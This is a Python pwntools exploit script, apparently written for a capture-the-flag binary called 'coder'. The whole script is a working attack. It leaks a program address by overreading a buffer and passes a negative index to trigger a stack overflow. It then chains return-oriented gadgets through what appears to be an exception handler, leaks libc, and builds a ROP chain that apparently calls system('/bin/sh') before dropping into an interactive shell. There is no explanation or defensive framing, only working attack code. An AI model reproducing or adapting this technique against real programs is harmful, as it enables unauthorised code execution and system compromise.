#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')


p=process("./coder")

def  code1():
    p.sendlineafter("[*] ","1")

def  code2():
    p.sendlineafter("[*] ","2")
    

def result():
    p.sendlineafter("[*] ","3")

def record(note):
    p.sendlineafter("[*] ","4")
    p.sendafter(": ",note)

def back(note):
    p.sendlineafter("[*] ","23333")
    p.sendafter(": ",note)

record("a"*0x210)
p.recvuntil("a"*0x210)
addr=u64(p.recv(6)+"\x00\x00")-0x155d
print hex(addr)
code2()
p.sendlineafter("[-] ","2")
# gdb.attach(p, 'b*$rebase(0x233C)\nb *$rebase(0x23B5)\nb *$rebase(0x243D)\n')
p.sendlineafter(": ","-1")
p.sendlineafter(": ","a"*0x128+p64(0)+p64(addr+0x5500)+p64(addr+0x243a)+p64(0)*5+p64(addr+0x2733)+p64(addr+0x4f78)+p64(addr+0x1304)+p64(addr+0x25d1))
# p64(addr+0x5500) bypass '.text:0000000000002457                 mov     [rbp-18h], rax' in catch
p.sendlineafter(": ","123")
p.recvuntil("!\n")
libc=u64(p.recv(6)+"\x00\x00")-0x875a0
print hex(libc)
# gdb.attach(p, 'b*$rebase(0x233C)\nb *$rebase(0x23B5)\n')
code2()
p.sendlineafter("[-] ","2")
p.sendlineafter(": ","-1")
p.sendlineafter(": ","a"*0x128+p64(0)+p64(addr+0x5500)+p64(addr+0x243a)+p64(0)*5+p64(addr + 0x000000000000101a)+p64(addr+0x2733)+p64(libc+0x1b75aa)+p64(libc+0x055410))
p.sendlineafter(": ","123")

p.interactive()